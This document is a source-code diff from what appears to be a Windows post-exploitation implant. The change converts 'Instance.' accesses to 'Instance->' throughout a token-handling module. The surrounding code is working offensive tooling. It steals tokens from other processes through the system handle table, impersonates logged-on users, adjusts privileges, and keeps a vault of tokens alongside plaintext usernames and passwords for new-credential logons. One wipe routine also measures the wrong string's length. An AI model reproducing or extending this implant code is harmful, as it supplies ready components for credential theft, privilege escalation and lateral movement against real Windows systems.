@@ -16,8 +16,8 @@
  *
  * Add it to the first token (parent):
  *
- * Token->Next            = Instance.Tokens.Vault;
- * Instance.Tokens.Vault = Token;
+ * Token->Next            = Instance->Tokens.Vault;
+ * Instance->Tokens.Vault = Token;
  *
  * Might reduce some code which i care more than
  * token order.
@@ -57,8 +57,8 @@ BOOL TokenDuplicate(
 
     /* duplicate token using native call */
     if ( ! NT_SUCCESS( NtStatus = SysNtDuplicateToken( TokenOriginal, Access, &ObjAttr, FALSE, TokenType, TokenNew ) ) ) {
-        NtSetLastError( Instance.Win32.RtlNtStatusToDosError( NtStatus ) );
-        PRINTF( "NtDuplicateToken: Failed:[%08x : %ld]\n", NtStatus, Instance.Win32.RtlNtStatusToDosError( NtStatus ) );
+        NtSetLastError( Instance->Win32.RtlNtStatusToDosError( NtStatus ) );
+        PRINTF( "NtDuplicateToken: Failed:[%08x : %ld]\n", NtStatus, Instance->Win32.RtlNtStatusToDosError( NtStatus ) );
         return FALSE;
     }
 
@@ -78,7 +78,7 @@ BOOL TokenRevSelf(
     NTSTATUS NtStatus = STATUS_SUCCESS;
 
     if ( ! NT_SUCCESS( NtStatus = SysNtSetInformationThread( NtCurrentThread(), ThreadImpersonationToken, &Token, sizeof( HANDLE ) ) ) ) {
-        NtSetLastError( Instance.Win32.RtlNtStatusToDosError( NtStatus ) );
+        NtSetLastError( Instance->Win32.RtlNtStatusToDosError( NtStatus ) );
         return FALSE;
     }
 
@@ -131,7 +131,7 @@ BOOL TokenQueryOwner(
         }
 
         /* now get the Username and Domain from the Sid */
-        if ( ! Instance.Win32.LookupAccountSidW( NULL, UserInfo->User.Sid, NULL, &UserLen, NULL, &DomnLen, &SidType ) )
+        if ( ! Instance->Win32.LookupAccountSidW( NULL, UserInfo->User.Sid, NULL, &UserLen, NULL, &DomnLen, &SidType ) )
         {
             SidType = 0;
 
@@ -158,7 +158,7 @@ BOOL TokenQueryOwner(
             }
 
             /* now lets try to get the owner */
-            if ( ! Instance.Win32.LookupAccountSidW( NULL, UserInfo->User.Sid, User, &UserLen, Domain, &DomnLen, &SidType ) ) {
+            if ( ! Instance->Win32.LookupAccountSidW( NULL, UserInfo->User.Sid, User, &UserLen, Domain, &DomnLen, &SidType ) ) {
                 PRINTF( "LookupAccountSidW Error => %d\n", NtGetLastError() );
                 goto LEAVE;
             }
@@ -209,7 +209,7 @@ BOOL TokenSetPrivilege(
     NTSTATUS         NtStatus        = STATUS_SUCCESS;
     HANDLE           hToken          = NULL;
 
-    if ( ! Instance.Win32.LookupPrivilegeValueA( NULL, Privilege, &TokenLUID ) ) {
+    if ( ! Instance->Win32.LookupPrivilegeValueA( NULL, Privilege, &TokenLUID ) ) {
         PRINTF( "[-] LookupPrivilegeValue error: %u\n", NtGetLastError() );
         return FALSE;
     }
@@ -224,12 +224,12 @@ BOOL TokenSetPrivilege(
     }
 
     if ( NT_SUCCESS( NtStatus = SysNtOpenProcessToken( NtCurrentProcess( ), TOKEN_ALL_ACCESS, &hToken ) ) ) {
-        if ( ! Instance.Win32.AdjustTokenPrivileges( hToken, FALSE, &TokenPrivileges, 0, NULL, NULL ) ) {
+        if ( ! Instance->Win32.AdjustTokenPrivileges( hToken, FALSE, &TokenPrivileges, 0, NULL, NULL ) ) {
             PRINTF( "[-] AdjustTokenPrivileges error: %u\n", NtGetLastError() );
             return FALSE;
         }
     } else {
-        PRINTF( "NtOpenProcessToken: Failed [%d]", Instance.Win32.RtlNtStatusToDosError( NtStatus ) )
+        PRINTF( "NtOpenProcessToken: Failed [%d]", Instance->Win32.RtlNtStatusToDosError( NtStatus ) )
         PACKAGE_ERROR_NTSTATUS( NtStatus )
         return FALSE;
     }
@@ -333,7 +333,7 @@ DWORD TokenAdd(
     PTOKEN_LIST_DATA TokenEntry  = NULL;
     DWORD            TokenIndex  = 0;
 
-    TokenEntry              = Instance.Win32.LocalAlloc( LPTR, sizeof( TOKEN_LIST_DATA ) );
+    TokenEntry              = Instance->Win32.LocalAlloc( LPTR, sizeof( TOKEN_LIST_DATA ) );
     TokenEntry->Handle      = hToken;
     TokenEntry->DomainUser  = DomainUser;
     TokenEntry->dwProcessID = dwProcessID;
@@ -343,12 +343,12 @@ DWORD TokenAdd(
     TokenEntry->lpPassword  = Password;
     TokenEntry->NextToken   = NULL;
 
-    if ( Instance.Tokens.Vault == NULL ) {
-        Instance.Tokens.Vault = TokenEntry;
+    if ( Instance->Tokens.Vault == NULL ) {
+        Instance->Tokens.Vault = TokenEntry;
         return TokenIndex;
     }
 
-    TokenList = Instance.Tokens.Vault;
+    TokenList = Instance->Tokens.Vault;
 
     /* add TokenEntry to Token linked list */
     while ( TokenList->NextToken != NULL ) {
@@ -397,8 +397,8 @@ BOOL SysDuplicateTokenEx(
         DuplicateTokenHandle);
     if ( ! NT_SUCCESS( NtStatus ) )
     {
-        PRINTF( "NtDuplicateToken: Failed:[%08x : %ld]\n", NtStatus, Instance.Win32.RtlNtStatusToDosError( NtStatus ) );
-        NtSetLastError( Instance.Win32.RtlNtStatusToDosError( NtStatus ) );
+        PRINTF( "NtDuplicateToken: Failed:[%08x : %ld]\n", NtStatus, Instance->Win32.RtlNtStatusToDosError( NtStatus ) );
+        NtSetLastError( Instance->Win32.RtlNtStatusToDosError( NtStatus ) );
         return FALSE;
     }
 
@@ -437,7 +437,7 @@ HANDLE TokenSteal(
             }
             else
             {
-                PRINTF( "NtDuplicateObject: Failed:[%08x : %ld]\n", NtStatus, Instance.Win32.RtlNtStatusToDosError( NtStatus ) )
+                PRINTF( "NtDuplicateObject: Failed:[%08x : %ld]\n", NtStatus, Instance->Win32.RtlNtStatusToDosError( NtStatus ) )
                 PACKAGE_ERROR_NTSTATUS( NtStatus )
             }
         }
@@ -453,7 +453,7 @@ HANDLE TokenSteal(
             }
             else
             {
-                PRINTF( "NtOpenProcessToken: Failed:[%08x : %ld]\n", NtStatus, Instance.Win32.RtlNtStatusToDosError( NtStatus ) )
+                PRINTF( "NtOpenProcessToken: Failed:[%08x : %ld]\n", NtStatus, Instance->Win32.RtlNtStatusToDosError( NtStatus ) )
                 PACKAGE_ERROR_NTSTATUS( NtStatus )
             }
         }
@@ -479,57 +479,57 @@ BOOL TokenRemove( DWORD TokenID )
     PTOKEN_LIST_DATA TokenItem  = NULL;
 
     TokenItem = TokenGet( TokenID );
-    TokenList = Instance.Tokens.Vault;
+    TokenList = Instance->Tokens.Vault;
 
     if ( ( ! TokenList ) || ( ! TokenItem ) )
         return FALSE;
 
-    if ( Instance.Tokens.Vault == TokenItem )
+    if ( Instance->Tokens.Vault == TokenItem )
     {
         PUTS( "Its first item" )
-        TokenItem = Instance.Tokens.Vault->NextToken;
+        TokenItem = Instance->Tokens.Vault->NextToken;
 
-        if ( Instance.Tokens.Impersonate && Instance.Tokens.Token->Handle == Instance.Tokens.Vault->Handle )
+        if ( Instance->Tokens.Impersonate && Instance->Tokens.Token->Handle == Instance->Tokens.Vault->Handle )
             TokenImpersonate( FALSE );
 
-        if ( Instance.Tokens.Vault->Handle )
+        if ( Instance->Tokens.Vault->Handle )
         {
-            SysNtClose( Instance.Tokens.Vault->Handle );
-            Instance.Tokens.Vault->Handle = NULL;
+            SysNtClose( Instance->Tokens.Vault->Handle );
+            Instance->Tokens.Vault->Handle = NULL;
         }
 
-        if ( Instance.Tokens.Vault->DomainUser )
+        if ( Instance->Tokens.Vault->DomainUser )
         {
-            MemSet( Instance.Tokens.Vault->DomainUser, 0, StringLengthW( Instance.Tokens.Vault->DomainUser ) * sizeof( WCHAR ) );
-            Instance.Win32.LocalFree( Instance.Tokens.Vault->DomainUser );
-            Instance.Tokens.Vault->DomainUser = NULL;
+            MemSet( Instance->Tokens.Vault->DomainUser, 0, StringLengthW( Instance->Tokens.Vault->DomainUser ) * sizeof( WCHAR ) );
+            Instance->Win32.LocalFree( Instance->Tokens.Vault->DomainUser );
+            Instance->Tokens.Vault->DomainUser = NULL;
         }
 
-        if ( Instance.Tokens.Vault->lpUser )
+        if ( Instance->Tokens.Vault->lpUser )
         {
-            MemSet( Instance.Tokens.Vault->lpUser, 0, StringLengthW( Instance.Tokens.Vault->lpUser ) * sizeof( WCHAR ) );
-            Instance.Win32.LocalFree( Instance.Tokens.Vault->lpUser );
-            Instance.Tokens.Vault->lpUser = NULL;
+            MemSet( Instance->Tokens.Vault->lpUser, 0, StringLengthW( Instance->Tokens.Vault->lpUser ) * sizeof( WCHAR ) );
+            Instance->Win32.LocalFree( Instance->Tokens.Vault->lpUser );
+            Instance->Tokens.Vault->lpUser = NULL;
         }
 
-        if ( Instance.Tokens.Vault->lpDomain )
+        if ( Instance->Tokens.Vault->lpDomain )
         {
-            MemSet( Instance.Tokens.Vault->lpDomain, 0, StringLengthW( Instance.Tokens.Vault->lpUser ) * sizeof( WCHAR ) );
-            Instance.Win32.LocalFree( Instance.Tokens.Vault->lpDomain );
-            Instance.Tokens.Vault->lpDomain = NULL;
+            MemSet( Instance->Tokens.Vault->lpDomain, 0, StringLengthW( Instance->Tokens.Vault->lpUser ) * sizeof( WCHAR ) );
+            Instance->Win32.LocalFree( Instance->Tokens.Vault->lpDomain );
+            Instance->Tokens.Vault->lpDomain = NULL;
         }
 
-        if ( Instance.Tokens.Vault->lpPassword )
+        if ( Instance->Tokens.Vault->lpPassword )
         {
-            MemSet( Instance.Tokens.Vault->lpPassword, 0, StringLengthW( Instance.Tokens.Vault->lpPassword ) * sizeof( WCHAR ) );
-            Instance.Win32.LocalFree( Instance.Tokens.Vault->lpPassword );
-            Instance.Tokens.Vault->lpPassword = NULL;
+            MemSet( Instance->Tokens.Vault->lpPassword, 0, StringLengthW( Instance->Tokens.Vault->lpPassword ) * sizeof( WCHAR ) );
+            Instance->Win32.LocalFree( Instance->Tokens.Vault->lpPassword );
+            Instance->Tokens.Vault->lpPassword = NULL;
         }
 
-        MemSet( Instance.Tokens.Vault, 0, sizeof( TOKEN_LIST_DATA ) );
-        Instance.Win32.LocalFree( Instance.Tokens.Vault );
+        MemSet( Instance->Tokens.Vault, 0, sizeof( TOKEN_LIST_DATA ) );
+        Instance->Win32.LocalFree( Instance->Tokens.Vault );
 
-        Instance.Tokens.Vault = TokenItem;
+        Instance->Tokens.Vault = TokenItem;
 
         return TRUE;
     }
@@ -544,7 +544,7 @@ BOOL TokenRemove( DWORD TokenID )
 
                 TokenList->NextToken = TokenItem->NextToken;
 
-                if ( Instance.Tokens.Impersonate && Instance.Tokens.Token->Handle == TokenItem->Handle )
+                if ( Instance->Tokens.Impersonate && Instance->Tokens.Token->Handle == TokenItem->Handle )
                     TokenImpersonate( FALSE );
 
                 if ( TokenItem->Handle )
@@ -556,33 +556,33 @@ BOOL TokenRemove( DWORD TokenID )
                 if ( TokenItem->DomainUser )
                 {
                     MemSet( TokenItem->DomainUser, 0, StringLengthW( TokenItem->DomainUser ) * sizeof( WCHAR ) );
-                    Instance.Win32.LocalFree( TokenItem->DomainUser );
+                    Instance->Win32.LocalFree( TokenItem->DomainUser );
                     TokenItem->DomainUser = NULL;
                 }
 
                 if ( TokenItem->lpUser )
                 {
                     MemSet( TokenItem->lpUser, 0, StringLengthW( TokenItem->lpUser ) * sizeof( WCHAR ) );
-                    Instance.Win32.LocalFree( TokenItem->lpUser );
+                    Instance->Win32.LocalFree( TokenItem->lpUser );
                     TokenItem->lpUser = NULL;
                 }
 
                 if ( TokenItem->lpDomain )
                 {
                     MemSet( TokenItem->lpDomain, 0, StringLengthW( TokenItem->lpUser ) * sizeof( WCHAR ) );
-                    Instance.Win32.LocalFree( TokenItem->lpDomain );
+                    Instance->Win32.LocalFree( TokenItem->lpDomain );
                     TokenItem->lpDomain = NULL;
                 }
 
                 if ( TokenItem->lpPassword )
                 {
                     MemSet( TokenItem->lpPassword, 0, StringLengthW( TokenItem->lpPassword ) * sizeof( WCHAR ) );
-                    Instance.Win32.LocalFree( TokenItem->lpPassword );
+                    Instance->Win32.LocalFree( TokenItem->lpPassword );
                     TokenItem->lpPassword = NULL;
                 }
 
                 MemSet( TokenItem, 0, sizeof( TOKEN_LIST_DATA ) );
-                Instance.Win32.LocalFree( TokenItem );
+                Instance->Win32.LocalFree( TokenItem );
                 TokenItem = NULL;
 
                 return TRUE;
@@ -608,7 +608,7 @@ HANDLE TokenMake( LPWSTR User, LPWSTR Password, LPWSTR Domain )
         // TODO: at this point should I return NULL or just continue ? For now i just continue.
     }
 
-    if ( ! Instance.Win32.LogonUserW( User, Domain, Password, LOGON32_LOGON_NEW_CREDENTIALS, LOGON32_PROVIDER_DEFAULT, &hToken ) )
+    if ( ! Instance->Win32.LogonUserW( User, Domain, Password, LOGON32_LOGON_NEW_CREDENTIALS, LOGON32_PROVIDER_DEFAULT, &hToken ) )
     {
         PUTS( "LogonUserW: Failed" )
         PACKAGE_ERROR_WIN32
@@ -631,15 +631,15 @@ HANDLE TokenCurrentHandle(
     {
         if ( NtStatus != STATUS_NO_TOKEN )
         {
-            PRINTF( "NtOpenThreadToken: Failed:[%08x : %ld]\n", NtStatus, Instance.Win32.RtlNtStatusToDosError( NtStatus ) );
-            NtSetLastError( Instance.Win32.RtlNtStatusToDosError( NtStatus ) );
+            PRINTF( "NtOpenThreadToken: Failed:[%08x : %ld]\n", NtStatus, Instance->Win32.RtlNtStatusToDosError( NtStatus ) );
+            NtSetLastError( Instance->Win32.RtlNtStatusToDosError( NtStatus ) );
             return NULL;
         }
 
         if ( ! NT_SUCCESS( NtStatus = SysNtOpenProcessToken( NtCurrentProcess(), TOKEN_QUERY, &Token ) ) )
         {
-            PRINTF( "NtOpenProcessToken: Failed:[%08x : %ld]\n", NtStatus, Instance.Win32.RtlNtStatusToDosError( NtStatus ) );
-            NtSetLastError( Instance.Win32.RtlNtStatusToDosError( NtStatus ) );
+            PRINTF( "NtOpenProcessToken: Failed:[%08x : %ld]\n", NtStatus, Instance->Win32.RtlNtStatusToDosError( NtStatus ) );
+            NtSetLastError( Instance->Win32.RtlNtStatusToDosError( NtStatus ) );
             return NULL;
         }
     }
@@ -664,7 +664,7 @@ BOOL TokenElevated(
 PTOKEN_LIST_DATA TokenGet(
     IN DWORD TokenID
 ) {
-    PTOKEN_LIST_DATA TokenList  = Instance.Tokens.Vault;
+    PTOKEN_LIST_DATA TokenList  = Instance->Tokens.Vault;
     DWORD            TokenIndex = 0;
 
     for ( TokenIndex = 0; TokenIndex < TokenID && TokenList && TokenList->NextToken; ++TokenIndex ) {
@@ -681,7 +681,7 @@ PTOKEN_LIST_DATA TokenGet(
 VOID TokenClear(
     VOID
 ) {
-    PTOKEN_LIST_DATA TokenList  = Instance.Tokens.Vault;
+    PTOKEN_LIST_DATA TokenList  = Instance->Tokens.Vault;
     DWORD            TokenIndex = 0;
 
     TokenImpersonate( FALSE );
@@ -699,31 +699,31 @@ VOID TokenClear(
         TokenRemove( 0 );
     }
 
-    Instance.Tokens.Impersonate = FALSE;
-    Instance.Tokens.Vault       = NULL;
-    Instance.Tokens.Token       = NULL;
+    Instance->Tokens.Impersonate = FALSE;
+    Instance->Tokens.Vault       = NULL;
+    Instance->Tokens.Token       = NULL;
 }
 
 BOOL TokenImpersonate(
     IN BOOL Impersonate
 ) {
-    if ( Impersonate && ! Instance.Tokens.Impersonate && Instance.Tokens.Token )
+    if ( Impersonate && ! Instance->Tokens.Impersonate && Instance->Tokens.Token )
     {
         // impersonate the current token.
-        Instance.Tokens.Impersonate =  SysImpersonateLoggedOnUser( Instance.Tokens.Token->Handle );
-        return Instance.Tokens.Impersonate;
+        Instance->Tokens.Impersonate =  SysImpersonateLoggedOnUser( Instance->Tokens.Token->Handle );
+        return Instance->Tokens.Impersonate;
     }
-    else if ( ! Impersonate && Instance.Tokens.Impersonate ) {
+    else if ( ! Impersonate && Instance->Tokens.Impersonate ) {
     {
         // stop impersonating
-        Instance.Tokens.Impersonate = FALSE;
+        Instance->Tokens.Impersonate = FALSE;
         return TokenRevSelf();
     }
-    } else if ( Impersonate && ! Instance.Tokens.Token ) {
+    } else if ( Impersonate && ! Instance->Tokens.Token ) {
         return TRUE; // there is no token to impersonate in the first place
-    } else if ( Impersonate && Instance.Tokens.Impersonate ) {
+    } else if ( Impersonate && Instance->Tokens.Impersonate ) {
         return TRUE; // we are already impersonating
-    } else if ( ! Impersonate && ! Instance.Tokens.Impersonate ) {
+    } else if ( ! Impersonate && ! Instance->Tokens.Impersonate ) {
         return TRUE; // we are already not impersonating
     }
 
@@ -775,11 +775,11 @@ BOOL IsImpersonationToken( HANDLE token )
     LPVOID TokenImpersonationInfo  = NULL;
     DWORD  returned_tokinfo_length = 0;
 
-    TokenImpersonationInfo = Instance.Win32.LocalAlloc( LPTR, BUF_SIZE );
+    TokenImpersonationInfo = Instance->Win32.LocalAlloc( LPTR, BUF_SIZE );
     if ( ! TokenImpersonationInfo )
         return FALSE;
 
-    if ( Instance.Win32.GetTokenInformation( token, TokenImpersonationLevel, TokenImpersonationInfo, BUF_SIZE, &returned_tokinfo_length ) )
+    if ( Instance->Win32.GetTokenInformation( token, TokenImpersonationLevel, TokenImpersonationInfo, BUF_SIZE, &returned_tokinfo_length ) )
     {
         if ( *( ( SECURITY_IMPERSONATION_LEVEL* ) TokenImpersonationInfo ) >= SecurityImpersonation )
             ReturnValue = TRUE;
@@ -793,7 +793,7 @@ BOOL IsImpersonationToken( HANDLE token )
     }
 
     if ( TokenImpersonationInfo )
-        Instance.Win32.LocalFree( TokenImpersonationInfo );
+        Instance->Win32.LocalFree( TokenImpersonationInfo );
 
     return ReturnValue;
 }
@@ -809,7 +809,7 @@ BOOL CanTokenBeImpersonated( IN HANDLE hToken )
         return FALSE;
 
     // try to open a handle to the current token
-    Success = Instance.Win32.OpenThreadToken( NtCurrentThread(), MAXIMUM_ALLOWED, TRUE, &hImp );
+    Success = Instance->Win32.OpenThreadToken( NtCurrentThread(), MAXIMUM_ALLOWED, TRUE, &hImp );
 
     TokenRevSelf();
 
@@ -885,7 +885,7 @@ BOOL QueryObjectTypesInfo( POBJECT_TYPES_INFORMATION* pObjectTypes, PULONG pObje
     do
     {
         PrevBufferLength   = BufferLength;
-        ObjTypeInformation = Instance.Win32.LocalAlloc( LPTR, BufferLength );
+        ObjTypeInformation = Instance->Win32.LocalAlloc( LPTR, BufferLength );
 
         status = SysNtQueryObject(
             NULL,
@@ -967,10 +967,10 @@ BOOL GetTokenInfo(
         goto Cleanup;
     }
 
-    Instance.Win32.GetTokenInformation( hToken, TokenStatistics, NULL, 0, &returned_tokinfo_length );
-    TokenStatisticsInformation = Instance.Win32.LocalAlloc( LPTR, returned_tokinfo_length );
+    Instance->Win32.GetTokenInformation( hToken, TokenStatistics, NULL, 0, &returned_tokinfo_length );
+    TokenStatisticsInformation = Instance->Win32.LocalAlloc( LPTR, returned_tokinfo_length );
 
-    if ( Instance.Win32.GetTokenInformation( hToken, TokenStatistics, TokenStatisticsInformation, returned_tokinfo_length, &returned_tokinfo_length ) )
+    if ( Instance->Win32.GetTokenInformation( hToken, TokenStatistics, TokenStatisticsInformation, returned_tokinfo_length, &returned_tokinfo_length ) )
     {
         // save the token type
         *pTokenType = TokenStatisticsInformation->TokenType;
@@ -978,12 +978,12 @@ BOOL GetTokenInfo(
         if ( TokenStatisticsInformation->TokenType == TokenPrimary )
         {
             // get the token integrity level
-            Instance.Win32.GetTokenInformation(hToken, TokenIntegrityLevel, NULL, 0, &cbSize );
-            TokenIntegrityInformation = Instance.Win32.LocalAlloc( LPTR, cbSize );
+            Instance->Win32.GetTokenInformation(hToken, TokenIntegrityLevel, NULL, 0, &cbSize );
+            TokenIntegrityInformation = Instance->Win32.LocalAlloc( LPTR, cbSize );
 
-            if ( Instance.Win32.GetTokenInformation( hToken, TokenIntegrityLevel, TokenIntegrityInformation, cbSize, &cbSize ) )
+            if ( Instance->Win32.GetTokenInformation( hToken, TokenIntegrityLevel, TokenIntegrityInformation, cbSize, &cbSize ) )
             {
-                *pIntegrity = *Instance.Win32.GetSidSubAuthority(TokenIntegrityInformation->Label.Sid, (DWORD)(UCHAR)(*Instance.Win32.GetSidSubAuthorityCount(TokenIntegrityInformation->Label.Sid) - 1));
+                *pIntegrity = *Instance->Win32.GetSidSubAuthority(TokenIntegrityInformation->Label.Sid, (DWORD)(UCHAR)(*Instance->Win32.GetSidSubAuthorityCount(TokenIntegrityInformation->Label.Sid) - 1));
                 ReturnValue = TRUE;
             }
             else
@@ -994,10 +994,10 @@ BOOL GetTokenInfo(
         else if (TokenStatisticsInformation->TokenType == TokenImpersonation)
         {
             // get the token impersonation level
-            Instance.Win32.GetTokenInformation( hToken, TokenImpersonationLevel, NULL, 0, &returned_tokimp_length );
-            TokenImpersonationInformation = Instance.Win32.LocalAlloc( LPTR, returned_tokimp_length );
+            Instance->Win32.GetTokenInformation( hToken, TokenImpersonationLevel, NULL, 0, &returned_tokimp_length );
+            TokenImpersonationInformation = Instance->Win32.LocalAlloc( LPTR, returned_tokimp_length );
 
-            if ( Instance.Win32.GetTokenInformation( hToken, TokenImpersonationLevel, TokenImpersonationInformation, returned_tokimp_length, &returned_tokimp_length ) )
+            if ( Instance->Win32.GetTokenInformation( hToken, TokenImpersonationLevel, TokenImpersonationInformation, returned_tokimp_length, &returned_tokimp_length ) )
             {
                 *pImpersonationLevel = * ( ( SECURITY_IMPERSONATION_LEVEL * ) TokenImpersonationInformation );
                 ReturnValue = TRUE;
@@ -1042,7 +1042,7 @@ BOOL GetProcessesFromHandleTable( IN PSYSTEM_HANDLE_INFORMATION handleTableInfor
     BOOL ret_val = FALSE;
     PPROCESS_LIST process_list = NULL;
 
-    process_list = Instance.Win32.LocalAlloc( LPTR, sizeof(PROCESS_LIST) );
+    process_list = Instance->Win32.LocalAlloc( LPTR, sizeof(PROCESS_LIST) );
 
     PSYSTEM_HANDLE_TABLE_ENTRY_INFO handleInfo;
     for (ULONG i = 0; i < handleTableInformation->NumberOfHandles; i++)
@@ -1081,7 +1081,7 @@ BOOL GetAllHandles( OUT PSYSTEM_HANDLE_INFORMATION* phandle_table, OUT PULONG ph
     ULONG prev_buffer_size = buffer_size;
     PVOID handleTableInformation = NULL;
 
-    handleTableInformation = Instance.Win32.LocalAlloc( LPTR, buffer_size );
+    handleTableInformation = Instance->Win32.LocalAlloc( LPTR, buffer_size );
 
     while (TRUE)
     {
@@ -1096,7 +1096,7 @@ BOOL GetAllHandles( OUT PSYSTEM_HANDLE_INFORMATION* phandle_table, OUT PULONG ph
             // the buffer was too small, buffer_size now has the new length
             DATA_FREE( handleTableInformation, prev_buffer_size );
             prev_buffer_size = buffer_size;
-            handleTableInformation = Instance.Win32.LocalAlloc( LPTR, buffer_size );
+            handleTableInformation = Instance->Win32.LocalAlloc( LPTR, buffer_size );
             continue;
         }
         if ( ! NT_SUCCESS( status ) )
@@ -1172,7 +1172,7 @@ BOOL ListTokens( PUSER_TOKEN_DATA* pTokens, PDWORD pNumTokens )
         goto Cleanup;
 
     // allocate the USER_TOKEN_DATA table
-    Tokens = Instance.Win32.LocalAlloc( LPTR, BUF_SIZE * sizeof( USER_TOKEN_DATA ) );
+    Tokens = Instance->Win32.LocalAlloc( LPTR, BUF_SIZE * sizeof( USER_TOKEN_DATA ) );
     if ( ! Tokens )
         goto Cleanup;
 
@@ -1181,7 +1181,7 @@ BOOL ListTokens( PUSER_TOKEN_DATA* pTokens, PDWORD pNumTokens )
     {
         ProcessId = ProcessList->ProcessId[i];
 
-        if ( ProcessId == Instance.Session.PID )
+        if ( ProcessId == Instance->Session.PID )
             continue;
         if ( ProcessId == 0 )
             continue;
@@ -1297,7 +1297,7 @@ BOOL SysImpersonateLoggedOnUser( HANDLE hToken )
         &ReturnLength);
     if ( ! NT_SUCCESS( Status ) )
     {
-        PRINTF( "NtQueryInformationToken: Failed:[%08x : %ld]\n", Status, Instance.Win32.RtlNtStatusToDosError( Status ) );
+        PRINTF( "NtQueryInformationToken: Failed:[%08x : %ld]\n", Status, Instance->Win32.RtlNtStatusToDosError( Status ) );
         return FALSE;
     }
 
@@ -1351,7 +1351,7 @@ BOOL SysImpersonateLoggedOnUser( HANDLE hToken )
 
     if ( ! NT_SUCCESS( Status ) )
     {
-        PRINTF( "NtSetInformationThread: Failed:[%08x : %ld]\n", Status, Instance.Win32.RtlNtStatusToDosError( Status ) );
+        PRINTF( "NtSetInformationThread: Failed:[%08x : %ld]\n", Status, Instance->Win32.RtlNtStatusToDosError( Status ) );
         return FALSE;
     }
 
@@ -1369,7 +1369,7 @@ BOOL ImpersonateTokenInStore(
     }
 
     /* if we are already impersonating the selected token, do nothing */
-    if ( Instance.Tokens.Impersonate && TokenData->Handle == Instance.Tokens.Token->Handle ) {
+    if ( Instance->Tokens.Impersonate && TokenData->Handle == Instance->Tokens.Token->Handle ) {
         return TRUE;
     }
 
@@ -1384,13 +1384,13 @@ BOOL ImpersonateTokenInStore(
     }
 
     if ( SysImpersonateLoggedOnUser( TokenData->Handle ) ) {
-        Instance.Tokens.Impersonate = TRUE;
-        Instance.Tokens.Token       = TokenData;
+        Instance->Tokens.Impersonate = TRUE;
+        Instance->Tokens.Token       = TokenData;
 
         PRINTF( "[+] Successfully impersonated: %ls\n", TokenData->DomainUser );
     } else {
-        Instance.Tokens.Impersonate = FALSE;
-        Instance.Tokens.Token       = NULL;
+        Instance->Tokens.Impersonate = FALSE;
+        Instance->Tokens.Token       = NULL;
 
         PRINTF( "[!] Failed to impersonate token user: %ls\n", TokenData->DomainUser );
 
